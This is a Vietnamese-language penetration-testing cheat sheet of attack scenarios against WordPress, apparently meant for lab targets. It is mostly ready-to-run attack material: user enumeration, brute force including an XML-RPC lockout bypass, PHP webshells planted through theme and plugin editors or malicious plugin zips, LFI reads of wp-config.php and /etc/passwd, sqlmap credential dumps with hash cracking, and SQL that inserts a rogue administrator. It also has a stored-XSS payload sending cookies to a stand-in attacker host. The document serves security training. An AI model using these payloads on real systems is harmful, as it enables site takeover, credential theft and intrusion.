# WordPress — Kịch bản khai thác

## Mục lục

| Kịch bản | Mô tả |
|----------|-------|
| [Enumeration](#enumeration) | Thu thập thông tin WordPress |
| [Username Enumeration](#username-enumeration) | Liệt kê tài khoản người dùng |
| [Brute Force Login](#brute-force-login) | Tấn công đăng nhập |
| [Vulnerable Plugin / Theme](#vulnerable-plugin--theme) | Khai thác plugin/theme lỗi |
| [XML-RPC Abuse](#xml-rpc-abuse) | Lạm dụng XML-RPC |
| [File Upload RCE](#file-upload-rce) | Upload shell qua theme/plugin editor |
| [LFI / Path Traversal](#lfi--path-traversal) | Đọc file tùy ý |
| [SQL Injection](#sql-injection) | Injection qua plugin |
| [Privilege Escalation trong WP](#privilege-escalation-trong-wp) | Leo thang đặc quyền trong WordPress |
| [Credential Exposure](#credential-exposure) | Lộ thông tin nhạy cảm |

---

## Enumeration

### Xác định WordPress
```bash
# Kiểm tra dấu hiệu WordPress
curl -s http://target.lab | grep -i "wp-content\|wp-includes\|wordpress"

# Kiểm tra file đặc trưng
curl -s http://target.lab/wp-login.php
curl -s http://target.lab/wp-json/wp/v2/users
curl -s http://target.lab/readme.html        # thường lộ version
curl -s http://target.lab/license.txt
```

### WPScan — Enumeration tổng quát
```bash
# Scan cơ bản
wpscan --url http://target.lab

# Enumerate users, plugins, themes
wpscan --url http://target.lab --enumerate u,p,t

# Enumerate tất cả
wpscan --url http://target.lab --enumerate ap,at,u,tt,cb,dbe

# Dùng API token để có thêm thông tin CVE
wpscan --url http://target.lab --api-token <YOUR_TOKEN> --enumerate vp,vt,u
```

### Xác định version
```bash
# Từ meta tag
curl -s http://target.lab | grep 'content="WordPress'

# Từ readme.html
curl -s http://target.lab/readme.html | grep -i version

# Từ feed
curl -s http://target.lab/?feed=rss2 | grep '<generator>'
```

---

## Username Enumeration

### Qua REST API (mặc định bật)
```bash
# Liệt kê user qua REST API
curl -s http://target.lab/wp-json/wp/v2/users | python3 -m json.tool

# Kết quả trả về: id, name, slug (username)
```

### Qua author parameter
```bash
# Thử từng ID
curl -s -L http://target.lab/?author=1
curl -s -L http://target.lab/?author=2

# Nếu redirect đến /author/<username>/ → lộ username
```

### Qua WPScan
```bash
wpscan --url http://target.lab --enumerate u

# Aggressive mode
wpscan --url http://target.lab --enumerate u --plugins-detection aggressive
```

### Qua XML-RPC
```bash
# Kiểm tra XML-RPC có bật không
curl -s http://target.lab/xmlrpc.php

# Enumerate user qua system.listMethods
curl -s -X POST http://target.lab/xmlrpc.php -d '<?xml version="1.0"?>
<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>'
```

---

## Brute Force Login

### WPScan brute force
```bash
# Brute force với wordlist
wpscan --url http://target.lab --usernames admin --passwords /usr/share/wordlists/rockyou.txt

# Brute force nhiều user
wpscan --url http://target.lab --usernames users.txt --passwords passwords.txt

# Tăng thread
wpscan --url http://target.lab -U admin -P rockyou.txt --max-threads 10
```

### Qua XML-RPC (bypass rate limit)
```bash
# XML-RPC cho phép thử nhiều credential trong 1 request → bypass lockout
# Dùng tool: xmlrpc-brute hoặc script tự viết

curl -s -X POST http://target.lab/xmlrpc.php -d '<?xml version="1.0"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value><string>admin</string></value></param>
    <param><value><string>password123</string></value></param>
  </params>
</methodCall>'
```

### Qua wp-login.php
```bash
# Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.lab http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:ERROR"
```

---

## Vulnerable Plugin / Theme

### Tìm plugin/theme lỗi
```bash
# WPScan với API token để check CVE
wpscan --url http://target.lab --api-token <TOKEN> --enumerate vp,vt

# Kiểm tra version plugin thủ công
curl -s http://target.lab/wp-content/plugins/<plugin-name>/readme.txt | grep -i "stable tag\|version"
```

### Các lỗ hổng phổ biến trong plugin

**Unauthenticated File Upload → RCE**
```bash
# Ví dụ: plugin có endpoint upload không xác thực
curl -s -X POST http://target.lab/wp-content/plugins/vuln-plugin/upload.php \
  -F "file=@shell.php"

# Sau đó truy cập shell
curl http://target.lab/wp-content/uploads/shell.php?cmd=id
```

**Unauthenticated SQLi trong plugin**
```bash
# Ví dụ: tham số không được sanitize
sqlmap -u "http://target.lab/?page_id=1&vuln_param=1" --dbs --batch
```

**Stored XSS trong plugin**
```bash
# Inject payload vào comment / form
<script>document.location='http://attacker.lab/steal?c='+document.cookie</script>
```

**CSRF → Admin Action**
```bash
# Tạo trang HTML chứa form tự submit đến endpoint admin
# Dụ admin click link → thực hiện hành động với quyền admin
```

---

## XML-RPC Abuse

### Kiểm tra XML-RPC
```bash
curl -s http://target.lab/xmlrpc.php
# Trả về "XML-RPC server accepts POST requests only." → đang bật
```

### Brute force qua multicall (bypass lockout)
```bash
# system.multicall cho phép gửi nhiều lần thử trong 1 request
# Script Python ví dụ:
python3 - <<'EOF'
import requests

url = "http://target.lab/xmlrpc.php"
passwords = ["password", "123456", "admin", "letmein"]

calls = []
for pwd in passwords:
    calls.append({
        "methodName": "wp.getUsersBlogs",
        "params": ["admin", pwd]
    })

# Build XML multicall payload
# Gửi 1 request với nhiều credential → bypass per-IP lockout
EOF
```

### Đọc file qua SSRF (nếu có plugin hỗ trợ pingback)
```bash
# Pingback có thể dùng để SSRF
curl -s -X POST http://target.lab/xmlrpc.php -d '<?xml version="1.0"?>
<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param><value><string>http://attacker.lab/</string></value></param>
    <param><value><string>http://target.lab/</string></value></param>
  </params>
</methodCall>'
```

---

## File Upload RCE

### Qua Theme Editor (cần quyền Admin)
```
[ATTACKER] — Đăng nhập wp-admin với credential admin
→ Appearance → Theme Editor → chọn file .php (vd: 404.php)
→ Thêm PHP webshell vào cuối file:
   <?php system($_GET['cmd']); ?>
→ Save
→ Truy cập: http://target.lab/wp-content/themes/<theme>/404.php?cmd=id
```

### Qua Plugin Editor (cần quyền Admin)
```
[ATTACKER]
→ Plugins → Plugin Editor → chọn plugin đang active
→ Thêm webshell vào file .php của plugin
→ Save
→ Trigger plugin để execute code
```

### Upload Plugin độc hại (cần quyền Admin)
```bash
# Tạo plugin chứa webshell
mkdir evil-plugin
cat > evil-plugin/evil-plugin.php <<'EOF'
<?php
/**
 * Plugin Name: Evil Plugin
 * Version: 1.0
 */
system($_GET['cmd']);
EOF
zip -r evil-plugin.zip evil-plugin/

# Upload qua Plugins → Add New → Upload Plugin
# Sau đó activate và truy cập:
# http://target.lab/wp-content/plugins/evil-plugin/evil-plugin.php?cmd=id
```

### Upload Theme độc hại (cần quyền Admin)
```bash
# Tương tự plugin, tạo theme zip chứa webshell
mkdir evil-theme
cat > evil-theme/style.css <<'EOF'
/*
Theme Name: Evil Theme
*/
EOF
cat > evil-theme/index.php <<'EOF'
<?php system($_GET['cmd']); ?>
EOF
zip -r evil-theme.zip evil-theme/

# Upload qua Appearance → Themes → Add New → Upload Theme
```

---

## LFI / Path Traversal

### Tìm LFI trong plugin/theme
```bash
# Fuzz tham số file
wfuzz -c -w /usr/share/wordlists/LFI-gracefulsecurity-linux.txt \
  "http://target.lab/?page=FUZZ"

# Thử thủ công
curl "http://target.lab/?file=../../../../etc/passwd"
curl "http://target.lab/?template=../../../wp-config.php"
```

### Đọc wp-config.php (chứa DB credential)
```bash
# Nếu có LFI
curl "http://target.lab/?file=../wp-config.php"

# wp-config.php chứa:
# DB_NAME, DB_USER, DB_PASSWORD, DB_HOST
# AUTH_KEY, SECURE_AUTH_KEY (dùng để forge cookie)
# table_prefix (mặc định wp_)
```

---

## SQL Injection

### Tìm SQLi trong WordPress
```bash
# Scan với WPScan
wpscan --url http://target.lab --enumerate vp --api-token <TOKEN>

# Dùng sqlmap trên endpoint nghi ngờ
sqlmap -u "http://target.lab/?cat=1" --dbs --batch
sqlmap -u "http://target.lab/wp-admin/admin-ajax.php" \
  --data="action=vuln_action&id=1" --dbs --batch
```

### Dump credential từ database
```bash
# Dump bảng users
sqlmap -u "http://target.lab/?id=1" -D wordpress -T wp_users --dump --batch

# Kết quả: user_login, user_pass (MD5 hash)
# Crack hash
hashcat -m 400 hashes.txt /usr/share/wordlists/rockyou.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

### Thêm user admin qua SQLi
```sql
-- Nếu có SQLi write
INSERT INTO wp_users (user_login, user_pass, user_email, user_registered, user_status)
VALUES ('hacker', MD5('password123'), 'hacker@lab.local', NOW(), 0);

INSERT INTO wp_usermeta (user_id, meta_key, meta_value)
VALUES (LAST_INSERT_ID(), 'wp_capabilities', 'a:1:{s:13:"administrator";b:1;}');
```

---

## Privilege Escalation trong WP

### Subscriber → Admin qua plugin lỗi
```bash
# Một số plugin cho phép user thấp quyền thực hiện hành động admin
# Ví dụ: endpoint AJAX không kiểm tra capability

curl -s -X POST http://target.lab/wp-admin/admin-ajax.php \
  -b "wordpress_logged_in_<hash>=subscriber_cookie" \
  -d "action=update_user_role&user_id=2&role=administrator"
```

### Thay đổi role qua SQLi
```sql
UPDATE wp_usermeta
SET meta_value = 'a:1:{s:13:"administrator";b:1;}'
WHERE user_id = <your_user_id> AND meta_key = 'wp_capabilities';
```

### Forge authentication cookie (nếu có secret key)
```python
# Nếu đọc được wp-config.php → có AUTH_KEY và SECURE_AUTH_KEY
# Có thể forge cookie để đăng nhập với bất kỳ user nào
# Tool: https://github.com/Sjord/wpcookiegen
python3 wpcookiegen.py --user admin --key "<AUTH_KEY>"
```

---

## Credential Exposure

### wp-config.php
```bash
# Vị trí mặc định
/var/www/html/wp-config.php
/var/www/wordpress/wp-config.php
/public_html/wp-config.php

# Chứa: DB credential, secret keys, table prefix
```

### File backup lộ ra ngoài
```bash
# Tìm file backup phổ biến
curl -s http://target.lab/wp-config.php.bak
curl -s http://target.lab/wp-config.php~
curl -s http://target.lab/.wp-config.php.swp
curl -s http://target.lab/wp-config.php.old

# Dùng ffuf để fuzz
ffuf -u http://target.lab/FUZZ -w /usr/share/wordlists/backup-files.txt
```

### Debug log
```bash
# Nếu WP_DEBUG_LOG bật
curl -s http://target.lab/wp-content/debug.log
```

### User enumeration qua REST API
```bash
curl -s http://target.lab/wp-json/wp/v2/users
# Trả về: id, name, slug, description, link
```

---

## Workflow tổng quát

```
Bước 1 — Xác định WordPress + version
wpscan --url http://target.lab

Bước 2 — Enumerate user, plugin, theme
wpscan --url http://target.lab --enumerate u,vp,vt --api-token <TOKEN>

Bước 3 — Brute force login (nếu có username)
wpscan --url http://target.lab -U admin -P rockyou.txt

Bước 4 — Khai thác plugin/theme lỗi
→ Tìm CVE theo version → exploit

Bước 5 — Nếu có admin credential
→ Upload plugin/theme độc hại → RCE → reverse shell

Bước 6 — Đọc wp-config.php → DB credential
→ Dump database → crack hash → leo thang thêm
```

---

## Các CVE / lỗ hổng đáng chú ý

| CVE | Plugin/Component | Loại lỗ hổng |
|-----|-----------------|--------------|
| CVE-2021-24145 | Modern Events Calendar | Unauthenticated File Upload |
| CVE-2020-11738 | Snap Creek Duplicator | Path Traversal → LFI |
| CVE-2019-8942 | WordPress Core < 5.0.1 | Authenticated RCE via image crop |
| CVE-2022-21661 | WordPress Core < 5.8.3 | SQLi via WP_Query |
| CVE-2021-29447 | WordPress Core < 5.7.1 | XXE via media upload |
| CVE-2020-28037 | WordPress Core | Authenticated RCE via plugin install |

---

## Tips

- Luôn kiểm tra `/wp-json/wp/v2/users` trước — thường lộ username ngay
- XML-RPC multicall bypass lockout hiệu quả hơn brute force thông thường
- `wp-config.php` là mục tiêu ưu tiên — chứa DB cred và secret key
- Plugin/theme lỗi thường là vector tấn công chính, không phải WordPress core
- Sau khi có admin → upload plugin zip là cách nhanh nhất để RCE
